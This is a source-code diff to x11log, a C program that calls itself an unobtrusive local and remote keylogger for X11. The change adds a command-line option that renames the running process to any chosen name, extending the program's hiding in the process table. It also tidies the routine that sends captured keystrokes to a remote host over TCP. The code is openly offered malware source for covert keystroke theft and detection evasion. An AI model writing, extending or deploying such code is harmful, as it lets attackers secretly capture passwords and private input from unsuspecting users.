@@ -119,6 +119,7 @@ struct tm* initialize(int argc, char ** argv, struct config_struct* config) {
 #ifdef _HAVE_CURL
 	config->log_remote_http = 0;
 #endif
+	config->process_fakename = NULL;
 	config->remote_addr = NULL;
 	config->host = NULL;
 	config->port = 0;
@@ -127,7 +128,7 @@ struct tm* initialize(int argc, char ** argv, struct config_struct* config) {
 	config->log_remote_http_nodelay = 0;
 
 	/* parse cmdline arguments */
-	while((c = getopt(argc, argv, "s:f:H:h:?r:qdo")) != -1){
+	while((c = getopt(argc, argv, "O:s:f:H:h:?r:qdo")) != -1){
 		switch(c) {
 		  case 's':
 			if(strcmp(optarg, X_DEFAULT_DISPLAY) == 0)
@@ -160,10 +161,12 @@ struct tm* initialize(int argc, char ** argv, struct config_struct* config) {
 		  case 'd':
 			config->daemonize = 1;
 			break;
+		  case 'O':
+			config->process_fakename = smalloc(sizeof(char) * strlen(optarg) +1);
+			strcpy(config->process_fakename, optarg);
 		  case 'o':
 			config->obfuscate= 1;
 			break;
-		  //case 'h':
 		  case '?':
 			log(0, stderr, " x11log - a tiny, non-privileged, unobtrusive local/remote keylogger for X11.\n");
 			log(0, stderr, " (c) by Erik Sonnleitner <es@delta-xi.net> 2007/2011, licensed under GPLv3.\n\n");
@@ -182,6 +185,7 @@ struct tm* initialize(int argc, char ** argv, struct config_struct* config) {
 			log(0, stderr, "   -d              Daemonize (requires -f or -r or both).\n");
 			log(0, stderr, "   -q              Be quiet (no output to console).\n");
 			log(0, stderr, "   -o              Obfuscate process name in process table.\n");
+			log(0, stderr, "   -O <NAME>       Rename process to given argument.\n");
 			log(0, stderr, "   -?              Print usage.\n");
 
 			exit(EXIT_FAILURE);
@@ -228,7 +232,7 @@ struct tm* initialize(int argc, char ** argv, struct config_struct* config) {
 
 	/* to daemonize or not to daemonize */
 	if(config->daemonize)
-		daemonize((config->obfuscate) ? argv[0] : NULL);
+		daemonize((config->obfuscate) ? argv[0] : NULL, config);
 
 	/* cmdline arguments are always hidden */
 	for(i = 1; i < argc; i++)
@@ -364,9 +368,8 @@ int transmit_keystroke_inet(char* key, struct config_struct *opts){
 	server_addr.sin_addr = *((struct in_addr *)host->h_addr);
 	bzero(&(server_addr.sin_zero),8);
 
-	if(connect(sock, (struct sockaddr*)&server_addr, sizeof(struct sockaddr)) == -1) {
-	printf("\nXXX: %s\n", strerror(errno));
-		return ERR_CONNECT; }
+	if(connect(sock, (struct sockaddr*)&server_addr, sizeof(struct sockaddr)) == -1)
+		return ERR_CONNECT;
 
 	bytes_sent = send(sock, key, strlen(key), 0);
 	close(sock);
@@ -428,7 +431,7 @@ void log(int level, FILE* stream, const char *fmt, ...) {
 }
 
 
-int daemonize(char* child_process_name){
+int daemonize(char* child_process_name, struct config_struct* cfg){
 	pid_t pid, sid;
 	
 	pid  = fork();
@@ -446,11 +449,12 @@ int daemonize(char* child_process_name){
 
 	if(chdir("/") < 0)
 		fatal("Error setting work directory to /");
-	
+
 	/* process name obfuscation */
 	if(child_process_name != NULL) {
 		int process_name_len = strlen(child_process_name);
-		strncpy(child_process_name, PROCESS_FAKE_NAME, process_name_len);
+		strncpy(child_process_name, (cfg->process_fakename == NULL)
+			? PROCESS_FAKE_NAME : cfg->process_fakename, process_name_len);
 	}
 
 	close(STDIN_FILENO);
